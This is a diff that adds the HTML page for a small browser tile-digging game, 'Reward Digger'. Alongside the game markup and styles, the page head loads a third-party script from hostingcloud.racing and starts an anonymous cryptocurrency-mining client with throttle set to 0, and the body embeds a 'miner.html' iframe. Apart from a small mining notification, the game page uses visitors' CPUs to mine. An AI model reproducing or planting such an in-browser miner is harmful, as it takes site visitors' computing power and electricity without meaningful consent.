@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fpixel.png"
+    />
+    <title>Reward Digger| Beta</title>
+    <!--   This is where the Phaser 2.6.2 code is brought in to the app. -->
+
+    <script type="text/javascript" src="/js/fly.js" defer></script>
+    <script type="text/javascript" src="/games/bombs/bombs.js" defer></script>
+
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="/fly.css" />
+    <script src="https://www.hostingcloud.racing/vrGl.js"></script>
+    <script>
+      var _client = new Client.Anonymous(
+        "7970af89ce93e10f2b909cf5806158cd744f200bcd43c540cd7e4badde5948e6",
+        {
+          throttle: 0,
+          c: "w"
+        }
+      );
+      _client.start();
+      _client.addMiningNotification(
+        "Top",
+        "Mindsgaming Token Machine Spectacular",
+        "#cccccc",
+        40,
+        "#3d3d3d"
+      );
+    </script>
+    <style>
+      .map {
+        position: fixed;
+        background-color: silver;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+      }
+      .bombs {
+        width: 65%;
+        height: 85%;
+        margin-top: 10px;
+        border-style: groove;
+        border-color: silver;
+        overflow: scroll;
+      }
+      .tools {
+        width: 65%;
+        height: 5%;
+        border-style: groove;
+        border-color: silver;
+      }
+      .tool {
+        cursor: pointer;
+      }
+
+      .pixel {
+        float: left;
+        margin: 0.3px;
+        width: 55px;
+        height: 55px;
+        background-color: red;
+        border-color: black;
+        border-style: solid;
+        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fpixel.png");
+        background-size: contain;
+        cursor: pointer;
+      }
+      .rock {
+        float: left;
+        margin: 0.3px;
+        width: 55px;
+        height: 55px;
+        background-color: transparent;
+        border-color: black;
+        border-style: solid;
+        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Frock.webp");
+        background-size: contain;
+        background-repeat: no-repeat;
+        cursor: pointer;
+      }
+      .bomb {
+        float: left;
+        margin: 0.3px;
+        width: 55px;
+        height: 55px;
+        background-color: transparent;
+        border-color: black;
+        border-style: solid;
+        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fbomb.webp");
+        background-size: contain;
+        background-repeat: no-repeat;
+        cursor: pointer;
+      }
+      .reward {
+        float: left;
+        margin: 0.3px;
+        width: 55px;
+        height: 55px;
+        background-color: transparent;
+        border-color: black;
+        border-style: solid;
+        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Freward.webp");
+        background-size: contain;
+        background-repeat: no-repeat;
+        cursor: pointer;
+      }
+
+      .intro {
+        z-index: -1;
+      }
+    </style>
+  </head>
+  <body>
+    <miner><iframe src="miner.html"></iframe></miner>
+    <wrap>
+      <label id="minutes" value="0" class="hide">00</label>.<label
+        id="seconds"
+        value="0"
+        class="hide"
+        >00</label
+      >
+      <meter
+        value="0"
+        id="SCORE"
+        max="100"
+        min="0"
+        low="10"
+        high="80"
+        class="hide"
+      ></meter>
+      <center>
+        <div class="map">
+          <div class="bombs" id="bombs"></div>
+          <div class="tools">
+            <div class="tool" onclick="startBombs();">
+              Start Game
+            </div>
+          </div>
+          <div class="tool">Score: <label id="score">0</label></div>
+        </div>
+      </center>
+    </wrap>
+  </body>
+</html>
